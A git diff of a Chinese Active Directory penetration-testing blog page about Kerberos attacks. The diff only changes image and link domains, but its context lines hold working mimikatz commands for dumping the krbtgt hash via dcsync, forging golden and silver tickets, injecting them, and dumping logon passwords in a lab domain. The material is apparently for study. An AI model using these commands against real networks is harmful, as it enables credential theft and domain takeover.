@@ -64,7 +64,7 @@ window.onload=getCSS();
 			
 		<header id="header" class="site-header" 
 		
-		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/ADStudy-Part-5-Attack-Kerbroes.png)"
+		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://blog.thekingofduck.com/post-images/ADStudy-Part-5-Attack-Kerbroes.png)"
 		
 		>
 			<div class="site-branding">
@@ -172,7 +172,7 @@ window.onload=getCSS();
 </ul>
 <p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
 <p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1583318637446.png" alt="" loading="lazy"></figure>
 <h3 id="票据伪造">票据伪造</h3>
 <h4 id="golden-ticket">Golden Ticket</h4>
 <p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
@@ -188,16 +188,16 @@ window.onload=getCSS();
 <p>1.获取krbtgt hash</p>
 <pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1583324821594.png" alt="" loading="lazy"></figure>
 <p>2.生成票据文件</p>
 <pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
 </code></pre>
 <p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
-<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
+<img src="https://blog.thekingofduck.com/post-images/1583326167707.png" alt="" loading="lazy"></p>
 <p>3.将票据文件导入内存</p>
 <pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1583326531630.png" alt="" loading="lazy"></figure>
 <p>图中红线前后为导入金票前后的权限差异。</p>
 <p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
 <p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
@@ -260,10 +260,10 @@ window.onload=getCSS();
 </ul>
 <pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/1583327211454.png" alt="" loading="lazy"></figure>
 <pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/1583329253794.png" alt="" loading="lazy"></figure>
 <p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
 <h3 id="总结">总结</h3>
 <p>金票权限大，但是要过kdc，会留下日志。<br>
@@ -280,19 +280,19 @@ window.onload=getCSS();
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://thekingofduck.github.io/tag/S94dn9nFN/" rel="tag">攻击Kerbroes</a>	
+				<a href="https://blog.thekingofduck.com/tag/S94dn9nFN/" rel="tag">攻击Kerbroes</a>	
 				 
-				<a href="https://thekingofduck.github.io/tag/bNi_XRNGwr/" rel="tag">域渗透</a>	
+				<a href="https://blog.thekingofduck.com/tag/bNi_XRNGwr/" rel="tag">域渗透</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/" rel="prev"> 某APP逆向分析与通讯解密</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://blog.thekingofduck.com/post/Android-Program-Reverse-Analysis/" rel="prev"> 某APP逆向分析与通讯解密</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/" rel="next"> 域渗透学习笔记四：域认证机制Kerbroes刨析</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://blog.thekingofduck.com/post/ADStudy-Part-4-Kerbroes-Study/" rel="next"> 域渗透学习笔记四：域认证机制Kerbroes刨析</a></div>
 		
 		</div>
 	</nav>
